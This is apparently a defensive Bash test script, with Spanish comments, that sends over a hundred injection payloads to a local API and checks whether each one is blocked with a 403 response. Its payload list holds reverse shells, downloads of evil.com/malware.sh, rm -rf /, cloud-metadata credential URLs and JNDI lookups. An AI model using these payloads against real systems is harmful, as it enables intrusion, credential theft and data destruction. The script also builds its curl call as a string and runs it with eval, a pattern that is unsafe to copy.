#!/bin/bash

# ============================================================
# CONFIGURACIÓN
# ============================================================
BASE_URL="http://localhost:8000"
LOG_FILE="logAttack.txt"
REPORT_FILE="reporte_ataques.txt"

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

TOTAL=0
PASSED=0
FAILED=0
VULNERABILITIES=()
TOKEN=""

# ============================================================
# 📋 LISTA DE ENDPOINTS (COPIA DESDE app.js)
# ============================================================
ENDPOINTS=(
  "GET|/api/get|GET sin parámetros"
  "GET|/api/get/1|GET con parámetro en URL"
  "GET|/api/get-query?name=test|GET con query params"
  "POST|/api/post|POST sin parámetros en URL"
  "POST|/api/post/1|POST con parámetro en URL"
  "PUT|/api/put/1|PUT con parámetro en URL"
  "DELETE|/api/delete/1|DELETE con parámetro en URL"
  "PATCH|/api/patch/1|PATCH con parámetro en URL"
  "POST|/api/upload|POST /api/upload"
)

# ============================================================
# 🛡️ PAYLOADS REALES (100+)
# ============================================================
PAYLOADS=(

  # ========== XSS (20) ==========
  '{"input":"<script>alert(1)</script>"}'
  '{"input":"<img src=x onerror=alert(1)>"}'
  '{"input":"<a href=\"javascript:alert(1)\">click</a>"}'
  '{"input":"eval(\"alert(1)\")"}'
  '{"input":"<body onload=alert(1)>"}'
  '{"input":"javascript:alert(1)"}'
  '{"input":"<svg onload=alert(1)>"}'
  '{"input":"<iframe src=\"javascript:alert(1)\">"}'
  '{"input":"<object data=\"javascript:alert(1)\">"}'
  '{"input":"<embed src=\"javascript:alert(1)\">"}'
  '{"input":"<math><mi onmouseover=alert(1)>X</mi></math>"}'
  '{"input":"<details open ontoggle=alert(1)>"}'
  '{"input":"<input onfocus=alert(1) autofocus>"}'
  '{"input":"<select onfocus=alert(1) autofocus>"}'
  '{"input":"<textarea onfocus=alert(1) autofocus>"}'
  '{"input":"<video src=x onerror=alert(1)>"}'
  '{"input":"<audio src=x onerror=alert(1)>"}'
  '{"input":"<marquee onstart=alert(1)>text</marquee>"}'
  '{"input":"<link rel=\"stylesheet\" href=\"javascript:alert(1)\">"}'
  '{"input":"<style>body{background:url(javascript:alert(1))}</style>"}'

  # ========== SQL Injection (30) ==========
  '{"input":"test OR 1=1"}'
  '{"input":"test OR 1=1--"}'
  '{"input":"test OR 1=1#"}'
  '{"input":"test OR 1=1/*"}'
  '{"input":"test OR 1=1;--"}'
  '{"input":"test OR 1=1 AND 2=2"}'
  '{"input":"test OR 1=1 AND 2=1"}'
  '{"input":"test OR 1=1 AND 1=2"}'
  '{"input":"test OR 1=1 AND 1=1"}'
  '{"input":"test OR (1=1)"}'
  '{"input":"test UNION SELECT 1,2,3"}'
  '{"input":"test UNION ALL SELECT 1,2,3"}'
  '{"input":"test UNION SELECT null,null,null"}'
  '{"input":"test UNION SELECT * FROM users"}'
  '{"input":"test UNION SELECT username,password FROM users"}'
  '{"input":"test UNION SELECT 1,version()"}'
  '{"input":"test UNION SELECT 1,database()"}'
  '{"input":"test UNION SELECT 1,user()"}'
  '{"input":"test UNION SELECT 1,@@version"}'
  '{"input":"test UNION SELECT 1,current_user"}'
  '{"input":"test DROP TABLE users"}'
  '{"input":"test DROP TABLE users--"}'
  '{"input":"test DROP TABLE users#"}'
  '{"input":"test DROP TABLE users/*"}'
  '{"input":"test INSERT INTO users VALUES(\"admin\",\"pass\")"}'
  '{"input":"test UPDATE users SET admin=1"}'
  '{"input":"test DELETE FROM users"}'
  '{"input":"test EXEC xp_cmdshell(\"whoami\")"}'
  '{"input":"test SLEEP(10)"}'
  '{"input":"test BENCHMARK(10000000,MD5(1))"}'

  # ========== Command Injection (20) ==========
  '{"input":"test; rm -rf /"}'
  '{"input":"test; rm -rf /*"}'
  '{"input":"test; rm -rf /tmp/*"}'
  '{"input":"test && whoami"}'
  '{"input":"test && id"}'
  '{"input":"test && pwd"}'
  '{"input":"test && ls"}'
  '{"input":"test && cat /etc/passwd"}'
  '{"input":"test `whoami`"}'
  '{"input":"test `id`"}'
  '{"input":"test `pwd`"}'
  '{"input":"test `ls`"}'
  '{"input":"test; wget http://evil.com/malware.sh"}'
  '{"input":"test; curl http://evil.com/malware.sh"}'
  '{"input":"test; bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"}'
  '{"input":"test; nc -e /bin/sh 192.168.1.1 4444"}'
  '{"input":"test; python -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"192.168.1.1\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\""}'
  '{"input":"test; perl -e \"use Socket;$i=\\\"192.168.1.1\\\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");}\""}'
  '{"input":"test; echo \"malware\" > /tmp/malware"}'
  '{"input":"test; chmod +x /tmp/malware"}'

  # ========== SSRF (15) ==========
  '{"input":"http://169.254.169.254/latest/meta-data/"}'
  '{"input":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"}'
  '{"input":"http://169.254.169.254/latest/user-data/"}'
  '{"input":"http://metadata.google.internal/computeMetadata/v1/"}'
  '{"input":"http://metadata.google.internal/computeMetadata/v1/instance/"}'
  '{"input":"http://metadata.google.internal/computeMetadata/v1/project/"}'
  '{"input":"http://localhost:8080/admin"}'
  '{"input":"http://127.0.0.1:8080/admin"}'
  '{"input":"http://0.0.0.0:8080/admin"}'
  '{"input":"http://[::1]:8080/admin"}'
  '{"input":"file:///etc/passwd"}'
  '{"input":"file:///etc/shadow"}'
  '{"input":"file:///proc/self/environ"}'
  '{"input":"gopher://localhost:8080/_GET%20/admin"}'
  '{"input":"dict://localhost:8080/admin"}'

  # ========== SSTI (10) ==========
  '{"input":"{{7*7}}"}'
  '{"input":"${7*7}"}'
  '{"input":"{{config}}"}'
  '{"input":"${config}"}'
  '{"input":"{{self}}"}'
  '{"input":"${self}"}'
  '{"input":"{{self.__class__}}"}'
  '{"input":"${self.__class__}"}'
  '{"input":"{{request.application}}"}'
  '{"input":"${request.application}"}'

  # ========== Log4j / JNDI (10) ==========
  '{"input":"${jndi:ldap://evil.com/exploit}"}'
  '{"input":"${jndi:rmi://evil.com/exploit}"}'
  '{"input":"${jndi:dns://evil.com}"}'
  '{"input":"${jndi:http://evil.com/exploit}"}'
  '{"input":"${jndi:https://evil.com/exploit}"}'
  '{"input":"${env:PATH}"}'
  '{"input":"${env:HOME}"}'
  '{"input":"${sys:java.version}"}'
  '{"input":"${sys:os.name}"}'
  '{"input":"${java:version}"}'

  # ========== Prototype Pollution (10) ==========
  '{"input":"__proto__"}'
  '{"input":"constructor"}'
  '{"input":"prototype"}'
  '{"input":"__proto__","value":{"isAdmin":true}}'
  '{"input":"constructor","value":{"prototype":{"isAdmin":true}}}'
  '{"input":"Object.prototype","value":{"isAdmin":true}}'
  '{"input":"Array.prototype","value":{"isAdmin":true}}'
  '{"input":"Function.prototype","value":{"isAdmin":true}}'
  '{"input":"Object.prototype","value":{"polluted":"yes"}}'
  '{"input":"__proto__","value":{"admin":true}}'

  # ========== Path Traversal (10) ==========
  '{"input":"../../etc/passwd"}'
  '{"input":"../../../etc/passwd"}'
  '{"input":"../../../../etc/passwd"}'
  '{"input":"../../../../../etc/passwd"}'
  '{"input":".././../etc/passwd"}'
  '{"input":"..\\..\\windows\\win.ini"}'
  '{"input":"..%2F..%2Fetc%2Fpasswd"}'
  '{"input":"..\\..\\..\\..\\etc\\passwd"}'
  '{"input":"..\\..\\..\\..\\..\\etc\\passwd"}'
  '{"input":"..\\..\\..\\..\\..\\..\\etc\\passwd"}'

  # ========== Otras amenazas (10) ==========
  '{"input":"//evil.com"}'
  '{"input":"https://evil.com"}'
  '{"input":"http://evil.com"}'
  '{"input":"{\"$ne\": null}"}'
  '{"input":"{\"$gt\": \"\"}"}'
  '{"input":"{\"$regex\": \".*\"}"}'
  '{"input":"{\"$where\": \"1==1\"}"}'
  '{"input":"{\"$or\": [{\"username\": \"admin\"}, {\"password\": \"admin\"}]}"}'
  '{"input":"{\"$and\": [{\"username\": \"admin\"}, {\"password\": \"admin\"}]}"}'
  '{"input":"{\"$not\": {\"username\": \"admin\"}}"}'
)

# ============================================================
# FUNCIONES
# ============================================================

get_token() {
  echo -e "${YELLOW}🔑 Obteniendo token...${NC}"
  TOKEN=$(curl -s -X POST "${BASE_URL}/login" \
    -H "Content-Type: application/json" \
    -d '{"grant_type":"password","username":"admin","password":"admin123"}' \
    | jq -r '.access_token')
  
  if [ "$TOKEN" = "null" ] || [ -z "$TOKEN" ]; then
    echo -e "${RED}❌ Error: No se pudo obtener el token${NC}"
    exit 1
  fi
  echo -e "${GREEN}✅ Token obtenido${NC}"
  echo ""
}

init_logs() {
  > "$LOG_FILE"
  > "$REPORT_FILE"
  
  echo "═══════════════════════════════════════════════════════════════" > "$LOG_FILE"
  echo "        REPORTE DE ATAQUES" >> "$LOG_FILE"
  echo "        Fecha: $(date '+%Y-%m-%d %H:%M:%S')" >> "$LOG_FILE"
  echo "        Endpoints: ${#ENDPOINTS[@]}" >> "$LOG_FILE"
  echo "        Payloads: ${#PAYLOADS[@]}" >> "$LOG_FILE"
  echo "═══════════════════════════════════════════════════════════════" >> "$LOG_FILE"
  echo "" >> "$LOG_FILE"
}

test_attack() {
  local method="$1"
  local endpoint="$2"
  local payload="$3"
  local payload_index="$4"
  
  echo -e "${BLUE}🔴 [$payload_index] $method $endpoint${NC}"
  echo "🔴 [$payload_index] $method $endpoint" >> "$LOG_FILE"
  echo "   Payload: $payload" >> "$LOG_FILE"
  
  local input=$(echo "$payload" | jq -r '.input // empty')
  
  # Construir el comando curl
  if [ "$method" = "GET" ]; then
    # ✅ CORREGIDO: Usar --data-urlencode para evitar expansión de variables
    cmd="curl -s -w \"\n%{http_code}\" -X GET \"${BASE_URL}${endpoint}\""
    cmd="$cmd -H \"Authorization: Bearer $TOKEN\""
    if [ ! -z "$input" ]; then
      # Si el endpoint ya tiene query params, usamos -G para mezclar
      cmd="$cmd -G --data-urlencode \"input=$input\""
    fi
  else
    # POST, PUT, DELETE, PATCH con body JSON
    cmd="curl -s -w \"\n%{http_code}\" -X $method \"${BASE_URL}${endpoint}\""
    cmd="$cmd -H \"Authorization: Bearer $TOKEN\""
    cmd="$cmd -H \"Content-Type: application/json\""
    if [ ! -z "$payload" ] && [ "$payload" != "{}" ]; then
      cmd="$cmd -d '$payload'"
    fi
  fi
  
  response=$(eval $cmd 2>/dev/null)
  code=$(echo "$response" | tail -n1)
  body=$(echo "$response" | sed '$d')
  
  echo "   Código: $code" >> "$LOG_FILE"
  echo "   Respuesta: $body" >> "$LOG_FILE"
  
  if [ "$code" = "403" ]; then
    echo -e "   ${GREEN}✅ BLOQUEADO (403)${NC}"
    echo "   ✅ BLOQUEADO (403)" >> "$LOG_FILE"
    ((PASSED++))
  elif [ "$code" = "200" ] || [ "$code" = "201" ]; then
    echo -e "   ${RED}🚨 COMPROMETIDO ($code) - ¡VULNERABILIDAD!${NC}"
    echo "   🚨 COMPROMETIDO ($code) - ¡VULNERABILIDAD!" >> "$LOG_FILE"
    VULNERABILITIES+=("$method|$endpoint|$payload|$body|$code")
    echo "🚨 VULNERABILIDAD: $method $endpoint" >> "$REPORT_FILE"
    echo "   Payload: $payload" >> "$REPORT_FILE"
    echo "   Respuesta: $body" >> "$REPORT_FILE"
    echo "" >> "$REPORT_FILE"
    ((FAILED++))
  else
    echo -e "   ${YELLOW}⚠️ CÓDIGO INESPERADO ($code)${NC}"
    echo "   ⚠️ CÓDIGO INESPERADO ($code)" >> "$LOG_FILE"
    ((FAILED++))
  fi
  
  echo "" >> "$LOG_FILE"
  echo ""
  ((TOTAL++))
}

# ============================================================
# EJECUTAR ATAQUES
# ============================================================
init_logs
get_token

echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║     🛡️  ATAQUES AUTOMÁTICOS A TODOS LOS ENDPOINTS     ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}🔍 ENDPOINTS: ${#ENDPOINTS[@]} | PAYLOADS: ${#PAYLOADS[@]}${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

payload_index=0
for payload in "${PAYLOADS[@]}"; do
  ((payload_index++))
  
  for endpoint in "${ENDPOINTS[@]}"; do
    IFS='|' read -r method endpoint_path description <<< "$endpoint"
    test_attack "$method" "$endpoint_path" "$payload" "$payload_index"
  done
done

# ============================================================
# PRUEBAS DE AUTENTICACIÓN
# ============================================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}🔑 PRUEBAS DE AUTENTICACIÓN${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${BLUE}🔴 GET /api/get sin token (debe dar 401)${NC}"
response=$(curl -s -w "\n%{http_code}" -X GET "${BASE_URL}/api/get")
code=$(echo "$response" | tail -n1)
if [ "$code" = "401" ]; then
  echo -e "   ${GREEN}✅ 401 Unauthorized${NC}"
  ((PASSED++))
else
  echo -e "   ${RED}❌ Error ($code)${NC}"
  ((FAILED++))
fi
((TOTAL++))
echo ""

echo -e "${BLUE}🔴 POST /api/post con token inválido (debe dar 401)${NC}"
response=$(curl -s -w "\n%{http_code}" -X POST "${BASE_URL}/api/post" \
  -H "Authorization: Bearer token_falso" \
  -H "Content-Type: application/json" \
  -d '{"input":"test"}')
code=$(echo "$response" | tail -n1)
if [ "$code" = "401" ]; then
  echo -e "   ${GREEN}✅ 401 Unauthorized${NC}"
  ((PASSED++))
else
  echo -e "   ${RED}❌ Error ($code)${NC}"
  ((FAILED++))
fi
((TOTAL++))
echo ""

# ============================================================
# RESUMEN FINAL
# ============================================================
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${CYAN}📊 RESUMEN FINAL${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "📊 ${CYAN}Total de pruebas:${NC} $TOTAL"
echo -e "✅ ${GREEN}Pruebas exitosas (bloqueadas):${NC} $PASSED"
echo -e "❌ ${RED}Vulnerabilidades encontradas:${NC} $FAILED"
echo ""

if [ $FAILED -eq 0 ]; then
  echo -e "${GREEN}🎉 ¡TODAS LAS PRUEBAS PASARON! El sistema está seguro.${NC}"
else
  echo -e "${RED}⚠️ $FAILED vulnerabilidades encontradas.${NC}"
  echo -e "${YELLOW}📄 Revisa el reporte: $REPORT_FILE${NC}"
fi

echo ""
echo -e "${GREEN}📄 Log guardado en: $LOG_FILE${NC}"
echo -e "${GREEN}📄 Reporte guardado en: $REPORT_FILE${NC}"
echo ""
